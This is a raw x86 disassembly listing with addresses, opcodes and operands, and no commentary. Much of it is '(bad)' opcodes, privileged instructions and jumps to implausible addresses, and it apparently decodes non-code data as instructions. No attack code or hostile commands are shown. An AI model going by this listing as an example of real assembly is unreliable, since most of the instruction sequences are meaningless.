  42a92b:	inc    ebp
  42a92c:	push   ebp
  42a92d:	xor    ecx,DWORD PTR [ebx+0x5589f003]
  42a933:	and    al,0x8b
  42a935:	(bad)  
  42a936:	call   0x89df60c8
  42a93b:	test   DWORD PTR [eax-0x1],esp
  42a93e:	(bad)  
  42a93f:	inc    DWORD PTR [ecx+0xffff85]
  42a945:	dec    DWORD PTR [ecx-0x6a1f5f75]
  42a94b:	(bad)  
  42a94c:	inc    ebx
  42a94e:	dec    DWORD PTR [ebx-0x117ee316]
  42a954:	bound  eax,QWORD PTR [eax]
  42a956:	int    0x50
  42a958:	xor    eax,DWORD PTR [ebp-0x7f]
  42a95b:	mov    esi,DWORD PTR [edx]
  42a95d:	cwde   
  42a95e:	pushf  
  42a95f:	add    BYTE PTR [ebp-0x1],dh
  42a962:	mov    edi,edi
  42a964:	mov    al,ds:0x4d45ce08
  42a969:	inc    DWORD PTR [ebx]
  42a96b:	adc    al,0x83
  42a96d:	add    BYTE PTR [eax],0x1
  42a970:	adc    BYTE PTR [eax],al
  42a972:	push   ebp
  42a973:	inc    ebp
  42a974:	add    edi,edi
  42a976:	mov    edx,DWORD PTR [eax]
  42a978:	mov    ecx,DWORD PTR [ebp-0x60]
  42a97b:	push   esi
  42a97c:	adc    al,0x8
  42a97e:	mov    edx,DWORD PTR [ebp-0x8]
  42a981:	mov    ecx,DWORD PTR [ebp-0x4]
  42a984:	add    DWORD PTR [ebp-0x18],0xffffff8d
  42a988:	inc    DWORD PTR [eax+esi*8]
  42a98b:	inc    ebp
  42a98c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a98d:	mov    edx,DWORD PTR [ebp+0x1c]
  42a990:	add    DWORD PTR [ebp-0x14],eax
  42a993:	mov    edx,DWORD PTR [ebp-0x70]
  42a996:	cmp    eax,DWORD PTR [eax]
  42a998:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a999:	mov    eax,DWORD PTR [eax]
  42a99b:	sbb    al,0x73
  42a99d:	add    BYTE PTR [ebx],0x1
  42a9a0:	hlt    
  42a9a1:	add    BYTE PTR [eax+0x30],dl
  42a9a4:	mov    DWORD PTR [ecx],esi
  42a9a6:	hlt    
  42a9a7:	pop    ds
  42a9a8:	inc    ebp
  42a9a9:	xor    al,BYTE PTR [ebp+0x6c760f3a]
  42a9af:	(bad)  
  42a9b0:	push   DWORD PTR [edi]
  42a9b2:	mov    ecx,DWORD PTR [ebx+0x398503a4]
  42a9b8:	push   DWORD PTR [ebx-0x1]
  42a9bb:	mov    eax,DWORD PTR [ebp-0x740075]
  42a9c1:	sub    eax,DWORD PTR [eax]
  42a9c3:	add    eax,DWORD PTR [eax]
  42a9c5:	mov    DWORD PTR [ecx+0x5f],eax
  42a9c8:	mov    DWORD PTR [ebx+0x20],ebx
  42a9cb:	ret    0xff
  42a9ce:	mov    ecx,DWORD PTR [ebx+0x1cc783dc]
  42a9d4:	ret    
  42a9d5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  42a9db:	add    BYTE PTR [ebp-0x7d],al
  42a9de:	mov    DWORD PTR [eax],eax
  42a9e0:	sub    BYTE PTR [edi+edi*8+0x18008d01],al
  42a9e7:	sar    bh,cl
  42a9e9:	test   BYTE PTR [eax+0x1],dl
  42a9ec:	inc    ebp
  42a9ed:	add    BYTE PTR [ebx],dh
  42a9ef:	test   BYTE PTR [ebx],0x84
  42a9f2:	push   eax
  42a9f3:	add    BYTE PTR [ebp+0x0],al
  42a9f6:	add    eax,0x86
  42a9fb:	add    BYTE PTR [ebx-0x7f7be340],cl
  42aa01:	add    BYTE PTR [ecx],al
  42aa03:	add    BYTE PTR [eax],al
  42aa05:	mov    esi,0x550030
  42aa0a:	mov    ecx,DWORD PTR [edi]
  42aa0c:	sbb    al,0xda
  42aa0e:	jne    0x42aa10
  42aa10:	mov    edi,DWORD PTR [ecx]
  42aa12:	xor    BYTE PTR [eax+eax*1],0x84
  42aa16:	add    eax,DWORD PTR [eax]
  42aa18:	cld    
  42aa19:	add    BYTE PTR [ebp-0x4f],dh
  42aa1c:	mov    eax,DWORD PTR [ecx]
  42aa1e:	cld    
  42aa1f:	add    BYTE PTR [ecx-0x1bff009b],cl
  42aa25:	retf   0xe45
  42aa28:	add    eax,edx
  42aa2a:	sbb    al,0xb7
  42aa2c:	dec    ebp
  42aa2d:	or     al,0x89
  42aa2f:	dec    ebp
  42aa30:	sbb    al,0xf
  42aa32:	inc    ebp
  42aa33:	dec    eax
  42aa34:	mov    eax,DWORD PTR [ebx]
  42aa36:	sbb    al,0xf
  42aa38:	nop
  42aa39:	scas   al,BYTE PTR es:[edi]
  42aa3a:	add    DWORD PTR [eax],eax
  42aa3c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  42aa42:	mov    eax,gs
  42aa44:	add    bh,bh
  42aa46:	mov    edi,edi
  42aa48:	cmp    DWORD PTR [edi+0x72],edx
  42aa4b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  42aa51:	gs cmp al,0x0
  42aa54:	je     0x42aa2c
  42aa56:	push   eax
  42aa57:	sar    BYTE PTR [eax],1
  42aa59:	mov    bh,0x3e
  42aa5b:	push   cs
  42aa5c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  42aa62:	add    DWORD PTR [ecx+0x12],ebp
  42aa65:	dec    edx
  42aa66:	(bad)  
  42aa67:	mov    eax,edx
  42aa69:	in     al,dx
  42aa6a:	adc    DWORD PTR [ecx],esi
  42aa6c:	pop    esi
  42aa6d:	inc    ecx
  42aa6e:	leave  
  42aa6f:	or     DWORD PTR [eax],ebx
  42aa71:	gs push ebp
  42aa73:	add    ah,ch
  42aa75:	into   
  42aa76:	in     al,dx
  42aa77:	enter  0xb756,0xf0
  42aa7b:	push   cs
  42aa7c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  42aa86:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  42aa8c:	jnp    0x74432f94
  42aa92:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  42aa98:	add    BYTE PTR [edi],cl
  42aa9a:	mov    edi,DWORD PTR [ecx-0x78]
  42aa9d:	ltr    WORD PTR [ecx-0x7b]
  42aaa1:	dec    DWORD PTR [edi]
  42aaa3:	clc    
  42aaa4:	out    0x45,eax
  42aaa6:	add    BYTE PTR [eax],cl
  42aaa8:	cmp    ebx,0xffffff8c
  42aaab:	jge    0x42aaad
  42aaad:	jb     0x42aabf
  42aaaf:	je     0x51ab2f
  42aab5:	pop    edx
  42aab6:	push   esi
  42aab7:	mov    ecx,DWORD PTR [edi]
  42aab9:	in     al,dx
  42aaba:	rol    DWORD PTR [ebp+0x0],1
  42aabd:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  42aac4:	cmp    DWORD PTR [ecx],0xfffffff0
  42aac7:	hlt    
  42aac8:	mov    esp,DWORD PTR [eax+0xf034d2b]
  42aace:	(bad)  
  42aad0:	push   eax
  42aad1:	jns    0xb8428f4f
  42aad7:	lock push cs
  42aad9:	ror    edx,0x3
  42aadc:	test   BYTE PTR [ecx+0x5500e800],cl
  42aae2:	dec    eax
  42aae3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  42aae7:	(bad)  
  42aae8:	mov    esi,0x7f33ff5f
  42aaed:	inc    eax
  42aaee:	test   DWORD PTR [edx],eax
  42aaf0:	je     0x42aab2
  42aaf2:	mov    ecx,ecx
  42aaf4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  42aaf8:	and    eax,DWORD PTR [eax+0xf0103]
  42aafe:	jp     0x42aaec
  42ab00:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  42ab04:	add    edx,DWORD PTR [edi+0x74]
  42ab07:	sbb    BYTE PTR [ebp+0x4d001484],cl
  42ab0d:	add    BYTE PTR [ebp-0x74c48bbb],al
  42ab13:	je     0x42aa98
  42ab15:	cmp    eax,edi
  42ab17:	js     0x42ab3c
  42ab19:	add    eax,0xeb0fc003
  42ab1e:	jns    0x42aaab
  42ab20:	vmread DWORD PTR [ecx+0x45],ebx
  42ab24:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  42ab2a:	adc    al,0x8b
  42ab2c:	jge    0x42ab42
  42ab2e:	mov    edi,DWORD PTR [eax-0x4]
  42ab31:	add    edi,DWORD PTR [edi]
  42ab33:	or     bh,bh
  42ab35:	push   ebp
  42ab36:	push   es
  42ab37:	mov    DWORD PTR [ebp-0x4],ebx
  42ab3a:	add    edi,esi
  42ab3c:	pop    es
  42ab3d:	add    esi,DWORD PTR [edi-0x48ccf183]
  42ab43:	mov    DWORD PTR [esp+esi*8],ecx
  42ab46:	inc    ebp
  42ab47:	pop    ebp
  42ab48:	xor    DWORD PTR [esi-0x4],0x3b
  42ab4c:	add    edx,DWORD PTR [ecx+edi*1]
  42ab4f:	push   es
  42ab50:	clc    
  42ab51:	mov    bh,0xdb
  42ab53:	jp     0x42ab0c
  42ab55:	add    cl,BYTE PTR [esi]
  42ab57:	div    DWORD PTR [edi+0x4d8b0c1c]
  42ab5d:	test   edi,edi
  42ab5f:	je     0x42ab55
  42ab61:	mov    eax,ecx
  42ab63:	or     BYTE PTR [ebx],al
  42ab65:	dec    BYTE PTR [ecx+0x7d3bec7d]
  42ab6b:	jbe    0x42abdf
  42ab6d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  42ab73:	add    ecx,DWORD PTR [esi]
  42ab75:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  42ab7b:	add    eax,DWORD PTR [ebx-0x287af783]
  42ab81:	je     0x42abd0
  42ab83:	mov    DWORD PTR [ecx],edi
  42ab85:	mov    esi,eax
  42ab87:	hlt    
  42ab88:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  42ab8f:	jb     0x42ab51
  42ab91:	jmp    0x42ab7e
  42ab93:	xor    esi,DWORD PTR [ebx]
  42ab95:	pop    edi
  42ab96:	pop    esi
  42ab97:	pop    ebx
  42ab98:	ret    
  42ab99:	ret    0x8b
  42ab9c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  42aba2:	xor    DWORD PTR ds:0x89339c0c,0x56
  42aba9:	cld    
  42abaa:	cmp    DWORD PTR [ebp+0xf],eax
  42abad:	xor    al,0x85
  42abaf:	pushf  
  42abb0:	add    BYTE PTR [ebx+0x4d0cfc8b],cl
  42abb6:	ret    
  42abb7:	mov    edi,DWORD PTR [esi-0x4]
  42abba:	pop    eax
  42abbb:	dec    ebp
  42abbc:	jne    0x42ab49
  42abbe:	xor    edi,esp
  42abc0:	inc    eax
  42abc1:	dec    ebp
  42abc2:	jbe    0x42ac17
  42abc4:	inc    eax
  42abc5:	pop    ebp
  42abc6:	add    edx,DWORD PTR [esi+0x8]
  42abc9:	push   edi
  42abca:	dec    eax
  42abcb:	push   ecx
  42abcc:	mov    eax,edi
  42abce:	and    al,0xf0
  42abd0:	jo     0x42abbd
  42abd2:	mov    eax,DWORD PTR [ebx]
  42abd4:	sbb    BYTE PTR [ebp+0x4d],cl
  42abd7:	mov    eax,DWORD PTR [ebx]
  42abd9:	nop
  42abda:	or     BYTE PTR [eax],al
  42abdc:	jne    0x42ac35
  42abde:	cmp    ebx,DWORD PTR [esi+0x33893277]
  42abe4:	cld    
  42abe5:	xor    edi,edi
  42abe7:	add    edi,DWORD PTR [ebp+0x3]
  42abea:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  42abf0:	js     0x42ab76
  42abf2:	jae    0x42abf6
  42abf4:	(bad)  
  42abf6:	xor    al,0x5d
  42abf8:	jmp    0x42ab85
  42abfa:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  42ac01:	fdecstp 
  42ac03:	test   BYTE PTR [edi],ah
  42ac05:	add    bh,BYTE PTR [ebp+0x0]
  42ac08:	add    ebx,DWORD PTR [ebp-0x77]
  42ac0b:	mov    edi,eax
  42ac0d:	cmp    al,0x0
  42ac10:	adc    dh,BYTE PTR [ebx]
  42ac12:	jge    0x42ac17
  42ac14:	mov    edi,DWORD PTR [ebx]
  42ac16:	jl     0x42ac27
  42ac18:	clc    
  42ac19:	dec    edi
  42ac1a:	jge    0x42ac1c
  42ac1c:	mov    eax,DWORD PTR [ebx]
  42ac1e:	jb     0x42ac28
  42ac20:	mov    ecx,DWORD PTR [ebp-0x8]
  42ac23:	mov    edi,edi
  42ac25:	xor    edx,DWORD PTR [eax]
  42ac27:	add    edi,DWORD PTR [ebx]
  42ac29:	mov    DWORD PTR [ebp-0x10],edi
  42ac2c:	inc    edi
  42ac2d:	pop    ebp
  42ac2e:	jge    0x42ac6b
  42ac30:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  42ac34:	mov    edx,0xc05d87f0
  42ac39:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  42ac3d:	fimul  WORD PTR [eax]
  42ac3f:	fist   WORD PTR [ebp+0x1c]
  42ac42:	in     al,dx
  42ac43:	jne    0x42ac31
  42ac45:	mov    edi,DWORD PTR [edx-0x7a27a10]
  42ac4b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  42ac4f:	fdivp  st(0),st
  42ac51:	fild   WORD PTR [ebp+0x4510f85c]
  42ac57:	test   BYTE PTR [ebx+0x4d00fc02],cl
  42ac5d:	inc    ebp
  42ac5e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  42ac64:	mov    ebp,DWORD PTR [ebx-0x4]
  42ac67:	adc    al,0x8b
  42ac69:	rcl    DWORD PTR [eax],0x48
  42ac6c:	mov    esi,0x7080803
  42ac71:	fiadd  WORD PTR [ebp+0x4d]
  42ac74:	(bad)  
  42ac75:	mov    edx,DWORD PTR [edx-0x4]
  42ac78:	mov    edx,DWORD PTR [ebp-0x4]
  42ac7b:	xor    ebx,DWORD PTR [ebx+0x330103]
  42ac81:	mov    DWORD PTR [edi+0x872dc],edi
  42ac87:	xlat   BYTE PTR ds:[ebx]
  42ac88:	into   
  42ac89:	ffreep st(6)
  42ac8b:	retf   0x6c7
  42ac8e:	iret   
  42ac8f:	dec    ebp
  42ac90:	inc    ebp
  42ac91:	mov    DWORD PTR [ebx],edi
  42ac93:	fmul   QWORD PTR [edi]
  42ac95:	dec    ebp
  42ac96:	jnp    0x42accb
  42ac98:	add    BYTE PTR [ebx],al
  42ac9a:	mov    ecx,DWORD PTR [esp+edi*8]
  42ac9d:	inc    ebp
  42ac9e:	dec    ebp
  42ac9f:	lea    esi,[ebx]
  42aca1:	add    DWORD PTR [ebx],eax
  42aca3:	jb     0x42ace0
  42aca5:	add    BYTE PTR [edi],cl
  42aca7:	inc    ebp
  42aca8:	imul   eax,edi,0x858bd800
  42acae:	cld    
  42acaf:	clc    
  42acb0:	mov    DWORD PTR [ebp+0x0],eax
  42acb3:	inc    DWORD PTR [eax]
  42acb5:	or     al,0xde
  42acb7:	sbb    bh,0x1
  42acba:	retf   
  42acbb:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  42acc2:	dec    ebp
  42acc3:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  42acc9:	enter  0x12de,0xdf
  42accd:	inc    ebp
  42acce:	pop    ebp
  42accf:	dec    DWORD PTR [ebx-0x257f0ff4]
  42acd5:	add    DWORD PTR [edx],edx
  42acd7:	add    BYTE PTR [ebp+0x50],dl
  42acda:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  42ace0:	xor    ecx,DWORD PTR [ebx+eax*1+0xac73966]
  42ace7:	loopne 0x42ad00
  42ace9:	cdq    
  42acea:	push   ebp
  42aceb:	clc    
  42acec:	mov    eax,DWORD PTR [ebp-0x4]
  42acef:	xor    edx,edx
  42acf1:	add    esi,DWORD PTR [ebx]
  42acf3:	cmp    eax,DWORD PTR [ebx]
  42acf5:	hlt    
  42acf6:	cmp    DWORD PTR [ebx],esp
  42acf8:	or     al,BYTE PTR [ebp+0xf]
  42acfb:	mov    eax,DWORD PTR [edx]
  42acfd:	loopne 0x42acff
  42acff:	(bad)  
  42ad00:	mov    ecx,esi
  42ad02:	cld    
  42ad03:	pushf  
  42ad04:	pop    ebp
  42ad05:	sahf   
  42ad06:	mov    esi,DWORD PTR [edx]
  42ad08:	lock mov eax,eax
  42ad0b:	adc    BYTE PTR [ebx],al
  42ad0d:	or     BYTE PTR [ebx+0x4d001001],0xcf
  42ad14:	xor    ebp,DWORD PTR [edi+0x50e45189]
  42ad1a:	dec    ebp
  42ad1b:	mov    ecx,DWORD PTR [ebx-0x31390304]
  42ad21:	(bad)  
  42ad22:	iret   
  42ad23:	inc    ebp
  42ad24:	(bad)  
  42ad25:	jne    0x42ad74
  42ad27:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  42ad2d:	(bad)  
  42ad2e:	cmp    ebx,eax
  42ad30:	je     0x42acb8
  42ad32:	add    edi,edi
  42ad34:	or     bh,bh
  42ad36:	dec    ebp
  42ad37:	inc    ebp
  42ad38:	mov    esi,DWORD PTR [ebx]
  42ad3a:	cld    
  42ad3b:	add    ecx,esi
  42ad3d:	cmp    ecx,DWORD PTR [eax-0xc]
  42ad40:	mov    edx,DWORD PTR [edi]
  42ad42:	or     BYTE PTR [ebp-0x7c],al
  42ad45:	mov    ebx,DWORD PTR [esi-0x7639cd18]
  42ad4b:	test   BYTE PTR [esi+ebx*4],cl
  42ad4e:	inc    ebp
  42ad4f:	xor    dh,BYTE PTR [eax]
  42ad51:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  42ad58:	jne    0x42ad21
  42ad5a:	mov    ebp,esp
  42ad5c:	fcomp  DWORD PTR [ebx]
  42ad5e:	add    BYTE PTR [ecx],al
  42ad60:	inc    DWORD PTR [ebp-0x75]
  42ad63:	(bad)  
  42ad64:	cld    
  42ad65:	add    al,0xce
  42ad67:	mov    ecx,edi
  42ad69:	cld    
  42ad6a:	inc    ebp
  42ad6b:	fidivr WORD PTR [ebx]
  42ad6d:	fbstp  TBYTE PTR [ebp-0x3e]
  42ad70:	mov    eax,DWORD PTR [eax]
  42ad72:	adc    BYTE PTR [ebx-0x3974038b],cl
  42ad78:	fadd   st,st(7)
  42ad7a:	add    BYTE PTR [ebp-0x1],al
  42ad7d:	mov    ecx,DWORD PTR [esp+edi*8]
  42ad80:	inc    ebp
  42ad81:	mov    bh,0xc7
  42ad84:	loopne 0x42adcb
  42ad86:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  42ad8c:	sbb    al,0x33
  42ad8e:	pushf  
  42ad8f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  42ad95:	mov    eax,edi
  42ad97:	cwde   
  42ad98:	inc    ebp
  42ad99:	inc    ebp
  42ad9a:	jne    0x42ad27
  42ad9c:	mov    esp,esp
  42ad9e:	clc    
  42ad9f:	add    al,0x4d
  42ada1:	mov    DWORD PTR [ebx],esi
  42ada3:	or     al,0x33
  42ada5:	inc    ebp
  42ada6:	lea    ecx,[ebx-0x398d13fd]
  42adac:	add    bh,al
  42adae:	inc    ebp
  42adaf:	ror    DWORD PTR [ebx+0x45d829],0x8b
  42adb6:	add    ebp,esp
  42adb8:	shufps xmm1,xmm3,0xc7
  42adbc:	(bad)  
  42adbd:	jmp    0x7487e8e6
  42adc2:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  42adc8:	hlt    
  42adc9:	mov    ecx,DWORD PTR [edi]
  42adcb:	fadd   DWORD PTR [ebp+0x0]
  42adce:	xor    ecx,DWORD PTR [edi]
  42add0:	add    ecx,ecx
  42add2:	cmp    edi,edi
  42add4:	pmuludq mm7,QWORD PTR [edx+0x50]
  42add8:	(bad)  
  42add9:	jmp    0x42ad66
  42addb:	mov    edi,esp
  42addd:	or     al,0xc6
  42addf:	inc    ebp
  42ade0:	(bad)  
  42ade1:	mov    eax,DWORD PTR [ebp+0x10]
  42ade4:	jne    0x42ad6f
  42ade6:	mov    eax,DWORD PTR [ecx]
  42ade8:	clc    
  42ade9:	add    BYTE PTR [ebp-0x40],cl
  42adec:	xor    edx,DWORD PTR [eax-0x73]
  42adef:	jne    0x42adf2
  42adf1:	push   DWORD PTR [edx+0x8]
  42adf4:	add    BYTE PTR [ebp+0x45],al
  42adf7:	mov    ebp,ecx
  42adf9:	cld    
  42adfa:	add    BYTE PTR [ebp+0x0],cl
  42adfd:	xor    eax,DWORD PTR [ebp+0x3]
  42ae00:	lea    edi,[ebx]
  42ae02:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  42ae08:	sub    eax,0x5d330e4d
  42ae0d:	lea    esi,[ebx]
  42ae0f:	add    DWORD PTR [ebx],eax
  42ae11:	jb     0x42adfc
  42ae13:	add    BYTE PTR [eax],al
  42ae15:	inc    ebp
  42ae16:	add    bl,ch
  42ae18:	inc    ebp
  42ae19:	mov    esi,DWORD PTR [ebx]
  42ae1b:	or     al,0x3
  42ae1d:	(bad)  
  42ae1e:	mov    edi,eax
  42ae20:	in     al,dx
  42ae21:	scas   eax,DWORD PTR es:[edi]
  42ae22:	inc    ebp
  42ae23:	mov    esi,DWORD PTR [ebx]
  42ae25:	in     al,0x3
  42ae27:	add    al,0x89
  42ae29:	mov    ecx,DWORD PTR [eax+edi*8]
  42ae2c:	dec    ebp
  42ae2d:	(bad)  
  42ae2e:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3162]
  42ae35:	mov    ecx,eax
  42ae37:	cld    
  42ae38:	push   es
  42ae39:	dec    ebp
  42ae3a:	add    al,0x33
  42ae3c:	mov    DWORD PTR [ebx],eax
  42ae3e:	in     al,dx
  42ae3f:	cmp    DWORD PTR [ebp-0x67],eax
  42ae42:	mov    eax,DWORD PTR [ebp-0xba0068]
  42ae48:	mov    edx,DWORD PTR [ebp-0x4]
  42ae4b:	mov    ecx,DWORD PTR [ebp-0x18]
  42ae4e:	xor    ecx,DWORD PTR [ebp+0x3]
  42ae51:	cmp    DWORD PTR [ebx],0x8b32749d
  42ae57:	xor    edi,esp
  42ae59:	jmp    0xff76abab
  42ae5e:	add    ecx,DWORD PTR [ebp-0x3f]
  42ae61:	xor    ebx,DWORD PTR [edi]
  42ae63:	add    eax,ecx
  42ae65:	cmp    ebx,DWORD PTR [eax]
  42ae67:	mov    ecx,DWORD PTR [ebp-0x4]
  42ae6a:	mov    ecx,DWORD PTR [eax]
  42ae6c:	adc    BYTE PTR [ebp-0x80],al
  42ae6f:	jmp    0x42ae72
  42ae71:	mov    eax,DWORD PTR [eax]
  42ae73:	cld    
  42ae74:	mov    bh,0xc6
  42ae76:	push   ecx
  42ae77:	(bad)  
  42ae78:	jne    0x42aed8
  42ae7a:	dec    ecx
  42ae7c:	or     BYTE PTR [ecx+ebx*1],cl
  42ae7f:	push   ebp
  42ae80:	inc    ebp
  42ae81:	in     al,dx
  42ae82:	add    ebp,esp
  42ae84:	or     bh,al
  42ae86:	dec    ebp
  42ae87:	cld    
  42ae88:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  42ae8e:	xor    DWORD PTR [edx+eax*1],0xffffff9c
  42ae92:	dec    DWORD PTR [ebx+0x45510cf4]
  42ae98:	mov    DWORD PTR [ebx+0x5745fc0c],ecx
  42ae9e:	mov    edx,DWORD PTR [ecx+0xc]
  42aea1:	xor    eax,esi
  42aea3:	mov    edx,0xc172c7
  42aea8:	inc    ebp
  42aea9:	mov    esi,DWORD PTR [ebp+0x8]
  42aeac:	mov    eax,edx
  42aeae:	call   0x84c775a3
  42aeb3:	add    DWORD PTR [esi-0x76bace00],ebx
  42aeb9:	mov    ebp,eax
  42aebb:	or     BYTE PTR [eax],dl
  42aebd:	jo     0x42af0c
  42aebf:	push   edi
  42aec0:	xor    esi,DWORD PTR [ebp+0x3]
  42aec3:	(bad)  
  42aec4:	pmulhuw mm0,mm1
  42aec7:	test   DWORD PTR [ebp-0x8],ecx
  42aeca:	mov    DWORD PTR [ebp-0x67],eax
  42aecd:	mov    eax,DWORD PTR [ebp-0x4]
  42aed0:	xor    edi,DWORD PTR [ebp-0x73]
  42aed3:	xor    eax,DWORD PTR [ebx]
  42aed5:	xor    esi,DWORD PTR [edx+0x3]
  42aed8:	add    BYTE PTR [ecx],bh
  42aeda:	inc    ebp
  42aedb:	(bad)  
  42aedc:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  42aee2:	mov    DWORD PTR [eax],0x750f0004
  42aee8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  42aeee:	lock add BYTE PTR [ebp+0x0],al
  42aef2:	mov    esi,DWORD PTR [ebp-0x2c]
  42aef5:	mov    ebp,edx
  42aef7:	or     al,0x72
  42aef9:	ja     0x42aefb
  42aefb:	mov    edx,esi
  42aefd:	cld    
  42aefe:	(bad)  
  42af01:	cli    
  42af02:	mov    esi,DWORD PTR [ebp-0x4]
  42af05:	cmp    ecx,esi
  42af07:	bswap  edi
  42af09:	(bad)
  42af0d:	mov    esi,DWORD PTR [ebp-0x4]
  42af10:	mov    esi,ecx
  42af12:	clc    
  42af13:	repnz add esi,DWORD PTR [ebp+0x45]
  42af17:	push   ebx
  42af18:	xor    eax,DWORD PTR [ebp+0x3]
  42af1b:	xor    bl,BYTE PTR [edi-0x64]
  42af1e:	pop    ebx
  42af1f:	jmp    0x42afe6
  42af24:	mov    esi,DWORD PTR [ebp-0x7d]
  42af27:	xor    ebp,DWORD PTR [eax]
  42af29:	lea    eax,[ebp-0x8]
  42af2c:	xor    eax,0xc7ef9cf2
  42af31:	neg    eax
  42af33:	ins    DWORD PTR es:[edi],dx
  42af34:	test   esi,edi
  42af36:	clc    
  42af37:	pop    esp
  42af38:	inc    ebp
  42af39:	or     BYTE PTR [ecx+0x450f0c7d],cl
  42af3f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  42af45:	add    cl,al
  42af47:	jne    0x42aee7
  42af49:	mov    esi,DWORD PTR [edx]
  42af4b:	in     al,dx
  42af4c:	push   esi
  42af4d:	xor    BYTE PTR [ebp-0xe],dh
  42af50:	add    edi,esi
  42af52:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  42af58:	add    cl,bh
  42af5a:	mov    edi,DWORD PTR [ebp+0x8]
  42af5d:	mov    DWORD PTR [ebp-0x14],esi
  42af60:	add    esi,DWORD PTR [ebp+0x3c]
  42af63:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  42af69:	mov    ah,0x30
  42af6b:	sahf   
  42af6c:	pushf  
  42af6d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  42af73:	jne    0x42af00
  42af75:	mov    ecx,DWORD PTR [esp+ebp*8]
  42af78:	icebp  
  42af79:	icebp  
  42af7a:	shl    edx,0xf2
  42af7d:	(bad)  
  42af7e:	mov    ah,0x16
  42af80:	push   0xf8b9375
  42af85:	in     al,dx
  42af86:	jmp    0x42af79
  42af88:	add    dl,dh
  42af8a:	mov    edi,esi
  42af8c:	or     al,0x8
  42af8e:	inc    ebp
  42af8f:	jne    0x42af94
  42af91:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  42af97:	ret    
  42af98:	or     bh,bh
  42af9a:	jge    0x42af84
  42af9c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  42afa2:	xor    edi,eax
  42afa4:	add    esi,DWORD PTR [ebp-0x77]
  42afa7:	mov    ebx,esp
  42afa9:	clc    
  42afaa:	neg    DWORD PTR [ebp-0x7c]
  42afad:	xor    eax,DWORD PTR [eax]
  42afaf:	cmp    eax,DWORD PTR [eax]
  42afb1:	repz jne 0x42af49
  42afb4:	xor    eax,DWORD PTR [ecx]
  42afb6:	add    ebx,DWORD PTR [eax]
  42afb8:	mov    DWORD PTR [ebp-0x8],eax
  42afbb:	mov    eax,edi
  42afbd:	cld    
  42afbe:	lock pop eax
  42afc0:	test   DWORD PTR [ebx],esi
  42afc2:	clc    
  42afc3:	add    edx,DWORD PTR [edi-0x740bff77]
  42afc9:	fdivp  st(4),st
  42afcb:	test   ecx,esi
  42afcd:	(bad)  
  42afce:	jnp    0x42afcf
  42afd0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  42afd6:	jae    0x42af63
  42afd8:	sub    edi,esp
  42afda:	(bad)  
  42afdb:	shl    DWORD PTR [eax-0x3e],0x89
  42afdf:	leave  
  42afe0:	call   0x819866ed
  42afe5:	in     al,dx
  42afe6:	(bad)  
  42afe7:	in     al,dx
  42afe8:	add    bh,al
  42afea:	mov    esp,edi
  42afec:	in     al,dx
  42afed:	test   DWORD PTR [ebp-0x8],edi
  42aff0:	mov    eax,DWORD PTR [ebp+0x2b]
  42aff3:	xor    al,0x3
  42aff5:	pushf  
  42aff6:	jnp    0x5731ac2f
  42affc:	xor    edx,DWORD PTR [edi-0x77]
  42afff:	push   ecx
  42b000:	loopne 0x42b035
  42b002:	jne    0x42afbf
  42b004:	mov    esi,DWORD PTR [edx-0x20]
  42b007:	add    BYTE PTR [ebp-0x3d],bh
  42b00a:	xor    eax,DWORD PTR [ebp-0x73]
  42b00d:	mov    edi,DWORD PTR [esi]
  42b00f:	cld    
  42b010:	jb     0x42afd8
  42b012:	add    bl,al
  42b014:	jne    0x42b05b
  42b016:	mov    edx,DWORD PTR [edi-0x10]
  42b019:	jge    0x42b098
  42b01b:	mov    esi,DWORD PTR [ebx]
  42b01d:	lock add ecx,DWORD PTR [ebp+0x3b]
  42b021:	xor    esi,DWORD PTR [ebp-0x77]
  42b024:	mov    esi,eax
  42b026:	lock inc ebp
  42b028:	jge    0x42b05f
  42b02a:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  42b031:	dec    ebp
  42b032:	mov    esi,DWORD PTR [ebx]
  42b034:	loopne 0x42afbf
  42b036:	jge    0x42b030
  42b038:	add    DWORD PTR [ebp-0x7d],eax
  42b03b:	cmc    
  42b03c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
